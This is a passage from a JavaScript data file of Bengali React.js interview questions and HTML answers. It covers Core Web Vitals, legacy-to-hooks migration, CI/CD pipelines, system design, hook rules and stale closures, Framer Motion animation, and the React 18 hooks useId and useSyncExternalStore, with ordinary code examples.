        <tr><td><strong>LCP</strong> (Largest Contentful Paint)</td><td>বৃহত্তম দৃশ্যমান কনটেন্ট কতক্ষণে লোড হলো</td><td>&lt; ২.৫s</td></tr>
        <tr><td><strong>INP</strong> (Interaction to Next Paint)</td><td>ইউজারের ক্লিকের পর UI কত দ্রুত সাড়া দেয়</td><td>&lt; ২০০ms</td></tr>
        <tr><td><strong>CLS</strong> (Cumulative Layout Shift)</td><td>লোডের সময় লেআউট কতটা অপ্রত্যাশিতভাবে সরে</td><td>&lt; ০.১</td></tr>
      </table>
      <h4>LCP অপ্টিমাইজেশন</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// প্রধান ছবি/কনটেন্ট আগে লোড করার অগ্রাধিকার দিন
<link rel="preload" as="image" href="/hero.webp" />

// Code splitting দিয়ে অপ্রয়োজনীয় JS আগে না পাঠানো
const HeavyChart = lazy(() => import('./HeavyChart'));
// ↑ প্রথম পেইন্টের জন্য অপ্রাসঙ্গিক কোড আলাদা bundle-এ</code></pre>
      </div>
      <p>React অ্যাপে LCP প্রায়ই খারাপ হয় কারণ: বড় JavaScript bundle প্রথমে ডাউনলোড ও পার্স হতে হয়, তারপর React hydrate/render করে, তারপর কনটেন্ট দেখা যায়। <strong>Server-side rendering বা static generation</strong> (Next.js) দিয়ে HTML সাথে সাথেই পাঠানো যায় — LCP নাটকীয়ভাবে উন্নত হয়।</p>
      <h4>INP অপ্টিমাইজেশন — সবচেয়ে React-নির্দিষ্ট</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ ভারী গণনা click handler-কে ব্লক করছে
function handleClick() {
  const result = expensiveCalculation(data);   // main thread ব্লক
  setResult(result);
}

// ✅ useTransition দিয়ে non-urgent আপডেট আলাদা করা
const [isPending, startTransition] = useTransition();
function handleClick() {
  startTransition(() => {
    const result = expensiveCalculation(data);
    setResult(result);   // এটি ইউজারের ইনপুট ব্লক করবে না
  });
}

// re-render কমাতে memoization
const MemoizedList = memo(ExpensiveList);
const sortedData = useMemo(() => sortLargeArray(data), [data]);</code></pre>
      </div>
      <p><strong>INP-এর সবচেয়ে সাধারণ কারণ:</strong> একটি ক্লিক হ্যান্ডলার ভারী কাজ (বড় লিস্ট re-render, জটিল গণনা) synchronously চালায় — main thread ব্লক হয়ে যায়, ব্রাউজার সাড়া দিতে পারে না। <code>useTransition</code>/<code>useDeferredValue</code> দিয়ে non-urgent কাজ আলাদা করলে ইউজারের ইনপুট (urgent) সাথে সাথে সাড়া পায়।</p>
      <h4>CLS অপ্টিমাইজেশন</h4>
      <ul>
        <li><strong>ছবি ও ভিডিওতে সবসময় <code>width</code>/<code>height</code> নির্ধারণ করুন</strong> — ব্রাউজার আগে থেকেই জায়গা বরাদ্দ রাখতে পারবে, লোড হওয়ার পর লেআউট না সরে।</li>
        <li><strong>Web font লোড হওয়ার আগে fallback font-এর আকার মেলান</strong> (<code>font-display: swap</code> + সাবধানে ফন্ট নির্বাচন) — নাহলে ফন্ট বদলালে টেক্সট সরে যায় (FOIT/FOUT)।</li>
        <li><strong>Skeleton loader-এ নির্দিষ্ট আকার দিন</strong> — কনটেন্ট লোড হওয়ার পর জায়গা যেন না বদলায়।</li>
        <li><strong>Dynamic content (বিজ্ঞাপন, banner) আগে থেকে জায়গা রিজার্ভ করে রাখুন।</strong></li>
      </ul>
      <h4>পরিমাপ ও মনিটরিং</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { onLCP, onINP, onCLS } from 'web-vitals';
onLCP((metric) => sendToAnalytics(metric));
onINP((metric) => sendToAnalytics(metric));
onCLS((metric) => sendToAnalytics(metric));
// ল্যাব ডেটা (Lighthouse) ও বাস্তব ইউজার ডেটা (RUM) প্রায়ই ভিন্ন —
// বাস্তব ব্যবহারকারীর ডিভাইস ও নেটওয়ার্কে যাচাই করা জরুরি</code></pre>
      </div>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>SSR ব্যবহার করলে hydration কীভাবে INP প্রভাবিত করে?</li>
        <li>Lighthouse স্কোর ভালো কিন্তু বাস্তব ইউজার মেট্রিক খারাপ — কেন হতে পারে?</li>
      </ul>
    `
  },
  {
    id: "react-48",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Migration","Upgrade","Legacy"],
    question: "Legacy React (Class components, Redux) থেকে Modern React-ে কীভাবে migrate করবেন?",
    answer: `
      <p>Legacy React কোডবেস (Class Component + Redux + লাইফসাইকেল মেথড) থেকে Modern React (Function Component + Hooks + হালকা state library) মাইগ্রেশন একটি বড় দল-স্তরের প্রকল্প — সঠিক কৌশল ছাড়া এটি ঝুঁকিপূর্ণ ও দীর্ঘ হয়ে যায়।</p>
      <h4>ধাপ ১: Big Bang নয় — Incremental মাইগ্রেশন</h4>
      <p>পুরো কোডবেস একবারে rewrite করা প্রায় সবসময় ভুল সিদ্ধান্ত — নতুন ফিচার আটকে যায়, রিগ্রেশনের ঝুঁকি বিশাল, এবং প্রকল্প মাসের পর মাস "প্রায় শেষ" অবস্থায় থাকে। <strong>Class ও Function কম্পোনেন্ট একসাথে coexist করতে পারে</strong> — React কোনো বাধা দেয় না।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// পুরনো Class কম্পোনেন্ট এবং নতুন Function কম্পোনেন্ট একই ট্রিতে
class LegacyDashboard extends React.Component {
  render() {
    return (
      <div>
        <OldSidebar />              {/* এখনও class, স্পর্শ করা হয়নি */}
        <NewUserProfile />          {/* নতুন কোড, hooks দিয়ে লেখা */}
      </div>
    );
  }
}</code></pre>
      </div>
      <h4>অগ্রাধিকার নির্ধারণ</h4>
      <ol>
        <li><strong>নতুন ফিচার সবসময় Function Component + Hooks দিয়ে লিখুন</strong> — নতুন legacy কোড তৈরি বন্ধ করাই প্রথম কাজ।</li>
        <li><strong>যে কম্পোনেন্ট ঘন ঘন পরিবর্তন হয় তাকে আগে মাইগ্রেট করুন</strong> — এভাবেই মাইগ্রেশনের খরচ স্বাভাবিক ডেভেলপমেন্টের সাথে মিশে যায়, আলাদা "মাইগ্রেশন স্প্রিন্ট" দরকার পড়ে না।</li>
        <li><strong>স্থিতিশীল, খুব কম পরিবর্তনশীল লিগ্যাসি কোড শেষে রাখুন</strong> বা একেবারেই স্পর্শ না করুন — যদি ভালো কাজ করে এবং বদলাতে হয় না, মাইগ্রেশনের ROI কম।</li>
      </ol>
      <h4>Class → Function ম্যাপিং</h4>
      <table>
        <tr><th>Class API</th><th>Hook সমতুল্য</th></tr>
        <tr><td><code>this.state</code> / <code>setState</code></td><td><code>useState</code></td></tr>
        <tr><td><code>componentDidMount</code></td><td><code>useEffect(fn, [])</code></td></tr>
        <tr><td><code>componentDidUpdate</code></td><td><code>useEffect(fn, [deps])</code></td></tr>
        <tr><td><code>componentWillUnmount</code></td><td><code>useEffect</code>-এর cleanup return</td></tr>
        <tr><td><code>this.instanceVar</code></td><td><code>useRef</code></td></tr>
        <tr><td><code>static getDerivedStateFromError</code>/<code>componentDidCatch</code></td><td>কোনো hook নেই — Error Boundary এখনও class-ই থাকতে হয়</td></tr>
      </table>
      <p><strong>গুরুত্বপূর্ণ সতর্কতা:</strong> <code>componentDidMount</code> + <code>componentDidUpdate</code> একসাথে <code>useEffect</code>-এ মেলে না এক-এক করে — dependency array-এর আচরণ ভিন্ন এবং প্রায়ই একাধিক effect-এ ভাগ করাই সঠিক পদ্ধতি।</p>
      <h4>Redux → হালকা State Management</h4>
      <p>Redux-এর boilerplate (action, reducer, dispatch, connect/mapStateToProps) প্রায়ই অতিরিক্ত জটিল আধুনিক প্রয়োজনের তুলনায়। মাইগ্রেশন কৌশল:</p>
      <ul>
        <li><strong>Local/feature-স্তরের state:</strong> <code>useState</code>/<code>useReducer</code>-এ সরিয়ে নিন — সব state Redux-এ রাখার প্রয়োজন নেই।</li>
        <li><strong>সত্যিকারের global state:</strong> Zustand বা Jotai-এর মতো হালকা লাইব্রেরিতে ধীরে ধীরে migrate করুন — boilerplate অনেক কম, TypeScript-এর সাথে ভালো কাজ করে।</li>
        <li><strong>Server state (API ডেটা):</strong> React Query/TanStack Query-তে সরান — caching, refetching, loading/error state স্বয়ংক্রিয়ভাবে সামলায়, Redux-এ ম্যানুয়ালি করা এসব কোড অনেক কমে যায়।</li>
      </ul>
      <h4>ঝুঁকি কমানোর কৌশল</h4>
      <ul>
        <li><strong>Test coverage আগে নিশ্চিত করুন</strong> — মাইগ্রেশনের আগে যদি টেস্ট না থাকে, রিগ্রেশন ধরা পড়বে না।</li>
        <li><strong>Feature flag দিয়ে নতুন ও পুরনো কম্পোনেন্ট পাশাপাশি চালান</strong> — সমস্যা দেখা দিলে দ্রুত রোলব্যাক করা যায়।</li>
        <li><strong>একবারে একটি কম্পোনেন্ট, প্রতিটি PR ছোট রাখুন</strong> — রিভিউ সহজ হয়, বাগ দ্রুত ধরা পড়ে।</li>
      </ul>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Error Boundary কেন এখনও class component হতে হয়?</li>
        <li>বড় মাইগ্রেশনের সময় কীভাবে রিগ্রেশন ট্র্যাক করবেন?</li>
      </ul>
    `
  },
  {
    id: "react-49",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["CI/CD","Deployment","DevOps"],
    question: "React অ্যাপের CI/CD pipeline কীভাবে সেটআপ করবেন? Production deployment best practices কী?",
    answer: `
      <p>React অ্যাপ প্রোডাকশনে নেওয়ার আগে একাধিক ধাপ পার হতে হয় — বিল্ড অপ্টিমাইজেশন থেকে monitoring পর্যন্ত। এটি শুধু <code>npm run build</code> চালানো নয়।</p>
      <h4>CI Pipeline — প্রতিটি PR-এ যা চলা উচিত</h4>
      <div class="code-box">
        <div class="code-header"><span>yaml</span><button class="copy-btn">Copy</button></div>
        <pre><code># .github/workflows/ci.yml (উদাহরণ)
name: CI
on: [pull_request]
jobs:
  test:
    steps:
      - run: npm ci                    # lockfile থেকে হুবহু ইনস্টল
      - run: npm run lint              # ESLint
      - run: npm run type-check        # tsc --noEmit
      - run: npm run test -- --coverage
      - run: npm run build             # প্রোডাকশন বিল্ড সফল হচ্ছে কিনা যাচাই
      - run: npm run test:e2e          # Playwright/Cypress (ঐচ্ছিক, ধীর)</code></pre>
      </div>
      <p><strong>গুরুত্বপূর্ণ নীতি:</strong> merge হওয়ার আগে lint, type-check, test, build — এই চারটি ধাপ সব pass করা বাধ্যতামূলক করুন (branch protection rule দিয়ে)। বিল্ড ব্যর্থ হলে বা টেস্ট ফেল করলে merge ব্লক করে দেওয়া উচিত, মানুষের সিদ্ধান্তের উপর নির্ভর না করে।</p>
      <h4>Production Build অপ্টিমাইজেশন</h4>
      <ul>
        <li><strong>Code splitting:</strong> <code>React.lazy</code> + route-ভিত্তিক splitting দিয়ে প্রাথমিক bundle ছোট রাখা।</li>
        <li><strong>Bundle analysis:</strong> <code>source-map-explorer</code> বা Vite-এর <code>rollup-plugin-visualizer</code> দিয়ে নিয়মিত bundle-এর ভেতর কী আছে যাচাই করা — অপ্রত্যাশিত বড় dependency ধরা পড়ে।</li>
        <li><strong>Environment variable আলাদা করা:</strong> dev/staging/production-এর জন্য আলাদা <code>.env</code> — সিক্রেট কখনও ক্লায়েন্ট bundle-এ যাবে না তা নিশ্চিত করা।</li>
        <li><strong>Source map:</strong> প্রোডাকশন বিল্ডে source map তৈরি করুন কিন্তু পাবলিকভাবে সার্ভ করবেন না — error tracking টুলে (Sentry) আলাদাভাবে আপলোড করুন, যাতে stack trace readable থাকে কিন্তু কোড কেউ সরাসরি দেখতে না পারে।</li>
      </ul>
      <h4>Deployment কৌশল</h4>
      <div class="code-box">
        <div class="code-header"><span>text</span><button class="copy-btn">Copy</button></div>
        <pre><code>Blue-Green Deployment:
  পুরনো ভার্সন (Blue) চলতে থাকে → নতুন ভার্সন (Green) আলাদাভাবে ডিপ্লয় হয়
  → ট্রাফিক Green-এ সুইচ হয় → সমস্যা হলে সাথে সাথে Blue-এ ফিরে যাওয়া যায়

Canary Deployment:
  নতুন ভার্সন প্রথমে ৫% ব্যবহারকারীর কাছে যায় → মনিটর করা হয়
  → সমস্যা না থাকলে ধীরে ধীরে ১০০%-এ ছড়ানো হয়</code></pre>
      </div>
      <p>স্ট্যাটিক React অ্যাপের জন্য (Vercel, Netlify, CDN) rollback সহজ — শুধু আগের বিল্ড আবার সার্ভ করলেই হয়। Blue-green/canary মূলত তখন গুরুত্বপূর্ণ যখন সার্ভার-সাইড কম্পোনেন্ট (SSR, API) জড়িত থাকে।</p>
      <h4>Production-এ Monitoring</h4>
      <ul>
        <li><strong>Error tracking (Sentry, Bugsnag):</strong> রানটাইম এরর ক্যাপচার করে, স্ট্যাক ট্রেস ও ইউজার কনটেক্সট সহ — production bug ধরার প্রধান উপায়, কারণ ব্যবহারকারীরা সাধারণত বাগ রিপোর্ট করেন না।</li>
        <li><strong>Real User Monitoring (RUM):</strong> Core Web Vitals (LCP, INP, CLS) বাস্তব ব্যবহারকারীর ডিভাইস থেকে সংগ্রহ করে — Lighthouse-এর ল্যাব ডেটার চেয়ে বেশি নির্ভরযোগ্য।</li>
        <li><strong>Feature flag (LaunchDarkly, custom):</strong> নতুন ফিচার ধীরে ধীরে ছাড়ার এবং প্রয়োজনে দ্রুত বন্ধ করার সুযোগ দেয়, নতুন ডিপ্লয়মেন্ট ছাড়াই।</li>
      </ul>
      <h4>Rollback পরিকল্পনা</h4>
      <p>প্রতিটি ডিপ্লয়মেন্টের একটি স্পষ্ট rollback পথ থাকা উচিত — আগের বিল্ড আর্টিফ্যাক্ট রেখে দেওয়া, ডেটাবেস মাইগ্রেশন backward-compatible রাখা (নতুন কোড ডিপ্লয়ের আগেই migration চালানো, এবং migration যেন পুরনো কোডের সাথেও কাজ করে)। প্রোডাকশনে সমস্যা দেখা দিলে "আগে rollback করো, পরে root cause খুঁজো" — এই নীতি ডাউনটাইম কমায়।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Feature flag ব্যবহার করে কীভাবে A/B টেস্টিং করবেন?</li>
        <li>Backward-compatible ডেটাবেস মাইগ্রেশন বলতে ঠিক কী বোঝায়?</li>
      </ul>
    `
  },
  {
    id: "react-50",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Interview","System Design","Architecture"],
    question: "Frontend System Design Interview — একটি complex React অ্যাপ কীভাবে design করবেন? (যেমন: E-commerce)",
    answer: `
      <h4>Design Framework (RADIO):</h4>
      <ol>
        <li><strong>R — Requirements:</strong> Functional ও non-functional requirements।</li>
        <li><strong>A — Architecture:</strong> High-level component tree, data flow।</li>
        <li><strong>D — Data Model:</strong> State shape, API contracts।</li>
        <li><strong>I — Interface:</strong> Component API, props, hooks design।</li>
        <li><strong>O — Optimization:</strong> Performance, SEO, accessibility।</li>
      </ol>
      <p><strong>E-commerce Example State Management:</strong></p>
      <ul>
        <li>Server State: TanStack Query (products, categories)।</li>
        <li>URL State: Search params (filters, page, sort)।</li>
        <li>Client State: Zustand (cart, UI preferences)।</li>
      </ul>
    `
  },
  {
    id: "react-51",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Hooks Rules","Closure","Stale State"],
    question: "React Hooks-এর Rules কী কী? Stale closure সমস্যা কী এবং কীভাবে সমাধান করবেন?",
    answer: `
      <p>Hooks কাজ করে একটি লুকানো কিন্তু কঠোর নিয়মের উপর ভিত্তি করে — React <strong>hook কলের ক্রম</strong> ব্যবহার করে প্রতিটি hook-কে তার state-এর সাথে মেলায়, নাম দিয়ে নয়। এই নিয়ম ভাঙলে state ভুল জায়গায় লেগে যায়।</p>
      <h4>দুটি নিয়ম</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ নিয়ম ভঙ্গ: condition-এর ভেতরে hook
function Component({ isLoggedIn }) {
  if (isLoggedIn) {
    const [user, setUser] = useState(null);   // কখনও কল হয়, কখনও না
  }
  const [theme, setTheme] = useState('dark');  // ক্রম পরিবর্তনশীল!
}

// ✅ সঠিক: সবসময় টপ লেভেলে, একই ক্রমে
function Component({ isLoggedIn }) {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('dark');
  if (isLoggedIn) { /* condition ভেতরের লজিকে, hook কলে নয় */ }
}</code></pre>
      </div>
      <ol>
        <li><strong>শুধু টপ লেভেলে hook কল করুন</strong> — লুপ, condition বা নেস্টেড ফাংশনের ভেতরে নয়।</li>
        <li><strong>শুধু React ফাংশন থেকে কল করুন</strong> — React কম্পোনেন্ট বা custom hook থেকে, সাধারণ JavaScript ফাংশন থেকে নয়।</li>
      </ol>
      <h4>কেন এই নিয়ম — ভেতরের প্রক্রিয়া</h4>
      <p>React প্রতিটি কম্পোনেন্ট instance-এর জন্য একটি <strong>hook-এর array</strong> রাখে। প্রতিটি রেন্ডারে React ধরে নেয় hook গুলো <em>ঠিক একই ক্রমে</em> কল হবে — প্রথম <code>useState</code> কল সবসময় array-র index ০-এ, দ্বিতীয়টি index ১-এ, ইত্যাদি। এভাবেই React জানে কোন state কোন hook-এর।</p>
      <p>Condition-এর ভেতরে hook রাখলে, একবার রেন্ডারে সেটি কল হয় (index ২ দখল করে), পরের রেন্ডারে হয় না — ফলে পরবর্তী সব hook এক ধাপ সরে যায় এবং <strong>ভুল state-এর সাথে মিলে যায়</strong>। এটি চুপচাপ ভুল আচরণ তৈরি করে, প্রায়ই কোনো এরর ছাড়াই।</p>
      <h4>Stale Closure — দ্বিতীয় সবচেয়ে সাধারণ hook বাগ</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>function Counter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      console.log(count);        // ❌ সবসময় 0 প্রিন্ট করবে!
      // setCount(count + 1);    // ❌ প্রতিবার 0+1=1 সেট করবে, বাড়বে না
    }, 1000);
    return () => clearInterval(interval);
  }, []);   // ⚠️ খালি dependency array — এই closure চিরকাল প্রথম রেন্ডারের count মনে রাখে
}</code></pre>
      </div>
      <p><strong>কেন এটি ঘটে:</strong> প্রতিটি রেন্ডারে <code>count</code> একটি নতুন const ভ্যারিয়েবল — এটি সেই রেন্ডারের সাথে "জমাট বাঁধা" (closure)। <code>useEffect</code>-এর callback প্রথম রেন্ডারের সময় তৈরি হয়েছিল, তাই সেটি চিরকাল <code>count = 0</code>-এর রেফারেন্স ধরে রাখে — <code>count</code> আসলে বদলালেও এই callback জানে না।</p>
      <h4>Stale closure-এর সমাধান</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ সমাধান ১: dependency array-তে যোগ করা (effect বারবার re-run হবে)
useEffect(() => {
  const interval = setInterval(() => setCount(c => c + 1), 1000);
  return () => clearInterval(interval);
}, []);
// setCount-এ functional update (c => c + 1) ব্যবহার করে
// বর্তমান count-এর উপর নির্ভরতা এড়ানো হলো — এটিই সেরা প্যাটার্ন

// ✅ সমাধান ২: ref দিয়ে সর্বশেষ মান ট্র্যাক করা (জটিল ক্ষেত্রে)
const countRef = useRef(count);
countRef.current = count;
useEffect(() => {
  const interval = setInterval(() => console.log(countRef.current), 1000);
  return () => clearInterval(interval);
}, []);</code></pre>
      </div>
      <p><strong>সবচেয়ে ভালো অভ্যাস:</strong> <code>useState</code>-এর updater function-এ functional form (<code>c => c + 1</code>) ব্যবহার করলে বর্তমান state-এর উপর নির্ভরতাই দরকার হয় না — stale closure সমস্যা কাঠামোগতভাবেই এড়ানো যায়। <code>eslint-plugin-react-hooks</code>-এর <code>exhaustive-deps</code> নিয়ম এই ধরনের ভুল বেশিরভাগ ক্ষেত্রে কম্পাইল টাইমেই ধরে ফেলে।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>eslint-plugin-react-hooks কীভাবে hook নিয়ম প্রয়োগ করে?</li>
        <li>Custom hook-এ এই নিয়মগুলো কীভাবে প্রযোজ্য?</li>
      </ul>
    `
  },
  {
    id: "react-52",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Animation","Framer Motion","Transition"],
    question: "React-ে smooth animations কীভাবে করবেন? Framer Motion কীভাবে ব্যবহার করবেন?",
    answer: `
      <p>React-এ অ্যানিমেশন করার একাধিক স্তর আছে — সাধারণ CSS transition থেকে শুরু করে জটিল, ইন্টারাপ্ট-করা-যায় এমন gesture-driven অ্যানিমেশন পর্যন্ত। সঠিক টুল নির্ভর করে জটিলতার উপর।</p>
      <h4>স্তর ১: CSS Transition — সবচেয়ে সহজ, বেশিরভাগ ক্ষেত্রে যথেষ্ট</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>function Modal({ isOpen }) {
  return (
    <div className={\`modal \${isOpen ? 'modal-open' : ''}\`}>...</div>
  );
}
/* CSS */
.modal { opacity: 0; transform: translateY(-10px); transition: all 0.2s ease; }
.modal-open { opacity: 1; transform: translateY(0); }</code></pre>
      </div>
      <p>সাধারণ hover, fade, স্লাইডের জন্য CSS transition/animation-ই যথেষ্ট — <strong>GPU-accelerated</strong> (transform/opacity ব্যবহার করলে), কোনো JavaScript bundle খরচ নেই। সমস্যা হলো: enter ও exit অ্যানিমেশন আলাদা করা কঠিন — একটি এলিমেন্ট DOM থেকে সরানোর আগে exit অ্যানিমেশন শেষ হওয়ার জন্য অপেক্ষা করানো React-এর declarative মডেলে স্বাভাবিকভাবে আসে না।</p>
      <h4>স্তর ২: Framer Motion — enter/exit ও gesture</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { motion, AnimatePresence } from 'framer-motion';

function Modal({ isOpen }) {
  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -10 }}     // ← DOM থেকে সরানোর আগে এই অ্যানিমেশন চলে
          transition={{ duration: 0.2 }}
        >
          মোডাল কনটেন্ট
        </motion.div>
      )}
    </AnimatePresence>
  );
}</code></pre>
      </div>
      <p><strong>AnimatePresence</strong> Framer Motion-এর সবচেয়ে গুরুত্বপূর্ণ ফিচার — এটি একটি কম্পোনেন্ট DOM থেকে সরানোর আগে তার <code>exit</code> অ্যানিমেশন শেষ হওয়া পর্যন্ত অপেক্ষা করায় (React সাধারণত তাৎক্ষণিকভাবে unmount করে দেয়, exit অ্যানিমেশনের সুযোগ না দিয়ে)। এছাড়াও drag gesture, layout অ্যানিমেশন (<code>layout</code> prop দিয়ে, এলিমেন্টের অবস্থান বদলালে স্বয়ংক্রিয়ভাবে smoothly transition করে) সহজে করা যায়।</p>
      <h4>পারফরম্যান্স বিবেচনা</h4>
      <ul>
        <li><strong>শুধু <code>transform</code> ও <code>opacity</code> অ্যানিমেট করুন</strong> — এগুলো compositor thread-এ চলে, main thread ব্লক করে না এবং layout/paint recalculate করায় না। <code>width</code>, <code>top</code>, <code>margin</code> অ্যানিমেট করলে প্রতি ফ্রেমে layout recalculation হয় — jank সৃষ্টি করে।</li>
        <li><strong><code>will-change: transform</code></strong> ব্রাউজারকে আগে থেকে জানিয়ে দেয় যে এই এলিমেন্ট বদলাবে — কিন্তু অতিরিক্ত ব্যবহার মেমরি খরচ বাড়ায়, শুধু সক্রিয়ভাবে অ্যানিমেট হওয়া এলিমেন্টে ব্যবহার করুন।</li>
        <li><strong>bundle size:</strong> Framer Motion যথেষ্ট বড় (~৫০KB+) — শুধু মাঝে মাঝে ব্যবহৃত সাধারণ transition-এর জন্য পুরো লাইব্রেরি আনার আগে ভাবুন; CSS দিয়ে সম্ভব হলে সেটাই ভালো।</li>
      </ul>
      <h4>Reduced Motion Accessibility</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>const shouldReduceMotion = useReducedMotion();  // Framer Motion hook
<motion.div animate={{ x: shouldReduceMotion ? 0 : 100 }} />
/* অথবা CSS-এ */
@media (prefers-reduced-motion: reduce) {
  * { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
}</code></pre>
      </div>
      <p>যেসব ব্যবহারকারী vestibular disorder-এর কারণে motion কমাতে চান (OS সেটিংসে <code>prefers-reduced-motion</code>), তাদের জন্য অ্যানিমেশন কমিয়ে বা বন্ধ করে দেওয়া উচিত — এটি accessibility-র গুরুত্বপূর্ণ অংশ, প্রায়ই উপেক্ষিত হয়।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>compositor thread-এ অ্যানিমেশন চালানো main thread ব্লকিং কীভাবে এড়ায়?</li>
        <li>View Transitions API কী, এবং এটি Framer Motion-এর বিকল্প হতে পারে কি?</li>
      </ul>
    `
  },
  {
    id: "react-53",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["useId","useSyncExternalStore","React 18"],
    question: "React 18-এর নতুন hooks — useId এবং useSyncExternalStore কীভাবে কাজ করে?",
    answer: `
      <p>React 18 দুটি hook যোগ করেছে যেগুলো লাইব্রেরি লেখকদের জন্য বিশেষভাবে গুরুত্বপূর্ণ — Concurrent রেন্ডারিং-এর সাথে সঠিকভাবে কাজ করার জন্য।</p>
      <h4>useId — SSR-নিরাপদ ইউনিক আইডি</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>function FormField() {
  const id = useId();   // "«r1»" এর মতো একটি স্থিতিশীল, ইউনিক আইডি
  return (
    <>
      <label htmlFor={id}>ইমেইল</label>
      <input id={id} type="email" />
    </>
  );
}</code></pre>
      </div>
      <p><strong>সমস্যা যা এটি সমাধান করে:</strong> <code>&lt;label htmlFor&gt;</code>/<code>&lt;input id&gt;</code>-এর মতো accessibility সংযোগে ইউনিক আইডি দরকার হয়। আগে ডেভেলপাররা <code>Math.random()</code> বা একটি কাউন্টার ব্যবহার করতেন — কিন্তু SSR-এ এটি ভয়াবহ সমস্যা তৈরি করত: <strong>সার্ভার ও ক্লায়েন্ট আলাদা আলাদা random মান পেত</strong>, ফলে hydration mismatch হতো (সার্ভারের HTML-এ id="1" কিন্তু ক্লায়েন্ট hydration-এ id="2")।</p>
      <p><code>useId</code> React-এর component tree-এর অবস্থান থেকে ডিটারমিনিস্টিকভাবে আইডি তৈরি করে — সার্ভার ও ক্লায়েন্টে একই কম্পোনেন্ট গাছের একই অবস্থানে সবসময় একই আইডি আসবে। <strong>এটি key বা list-এর জন্য নয়</strong> — শুধু accessibility attribute-এর জন্য ব্যবহার করুন।</p>
      <h4>useSyncExternalStore — বাইরের স্টোর সাবস্ক্রাইব করা</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// একটি external store (React-এর বাইরের state, যেমন browser API বা custom store)
function subscribe(callback) {
  window.addEventListener('online', callback);
  window.addEventListener('offline', callback);
  return () => {
    window.removeEventListener('online', callback);
    window.removeEventListener('offline', callback);
  };
}
function getSnapshot() { return navigator.onLine; }

function useOnlineStatus() {
  return useSyncExternalStore(subscribe, getSnapshot);
}

function App() {
  const isOnline = useOnlineStatus();
  return <p>{isOnline ? '🟢 অনলাইন' : '🔴 অফলাইন'}</p>;
}</code></pre>
      </div>
      <p><strong>সমস্যা যা এটি সমাধান করে — Tearing:</strong> React 18-এ Concurrent রেন্ডারিং-এর কারণে একটি রেন্ডার মাঝপথে pause হয়ে অন্য কাজের জন্য জায়গা দিতে পারে। যদি কোনো external store (Redux, Zustand, বা browser API) সেই pause-এর মাঝে বদলে যায়, তাহলে একই রেন্ডারে থাকা বিভিন্ন কম্পোনেন্ট store-এর <strong>ভিন্ন ভিন্ন মান</strong> দেখতে পারে — একে "tearing" বলে, UI-এর কিছু অংশ পুরনো ডেটা, কিছু অংশ নতুন ডেটা দেখায়।</p>
      <p><code>useSyncExternalStore</code> React-কে জানিয়ে দেয় কীভাবে external store সাবস্ক্রাইব করতে হবে এবং প্রতিটি রেন্ডারে <code>getSnapshot()</code>-এর মাধ্যমে সামঞ্জস্যপূর্ণ মান নিশ্চিত করে — Concurrent রেন্ডারিং-এর মাঝে store বদলে গেলেও React সেটি সঠিকভাবে সামলায় (re-render বাধ্য করে বা tearing এড়ায়)।</p>
      <h4>এটি কারা ব্যবহার করে</h4>
      <p>বেশিরভাগ অ্যাপ ডেভেলপার সরাসরি <code>useSyncExternalStore</code> লিখবেন না — এটি মূলত <strong>state management লাইব্রেরি লেখকদের জন্য</strong> (Redux, Zustand, Jotai তাদের অভ্যন্তরীণ বাস্তবায়নে এটি ব্যবহার করে) React 18-এর Concurrent ফিচারের সাথে নিরাপদে ইন্টিগ্রেট করতে। browser API (online status, media query, localStorage) সাবস্ক্রাইব করার সময় সরাসরি অ্যাপ কোডেও এটি কাজে লাগে।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Tearing ঠিক কীভাবে ঘটে — একটি বাস্তব উদাহরণ দিন?</li>
        <li>useId কেন list key হিসেবে ব্যবহার করা উচিত নয়?</li>
      </ul>
    `
  },
  {
    id: "react-54",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Patterns","Inversion of Control","Headless"],
    question: "Headless Component Pattern কী? কেন এটি modern React library design-এ জনপ্রিয়?",
    answer: `
